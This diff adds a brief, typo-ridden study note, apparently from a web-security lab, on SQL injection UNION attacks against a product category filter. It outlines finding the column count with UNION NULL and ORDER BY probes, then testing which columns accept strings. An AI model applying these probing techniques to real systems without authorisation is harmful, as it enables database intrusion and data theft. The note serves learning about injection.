@@ -1,0 +1,39 @@
+SQL injection vulnerability in the product category filter
+
+use a UNION attack to retrieve data from other tables
+
+goal dentify a column that is compatible with string data.
+
+you should know UNION conditions:
+    - tables must have the same number of colums 
+    - tables must have the datatype
+
+
+#step1 determine number of coulumn
+    way1:
+        determined the number of columns
+        try1
+        -select ? of table UNION Null
+        ->server error mean that the number of col are not equal 
+        try2
+        -select ? of table UNION Null Null
+        ->200 ok correct number of col 
+
+
+    (cleaner)
+    way2:
+        determined the number of columns
+        try1
+        -select ? of table order by 4
+        ->server error mean col is not exits 
+        try2
+        -select ? of table order by 3
+        ->200 ok correct col 3 exist
+
+
+#step1 determine data type of colums
+
+    Select varchar , int from table UNION Select int , NULL from table2
+    ->error incomtabpel datatype
+    select varchar , int from table UNION Select varchar , NULL from table2
+    ->200 ok 
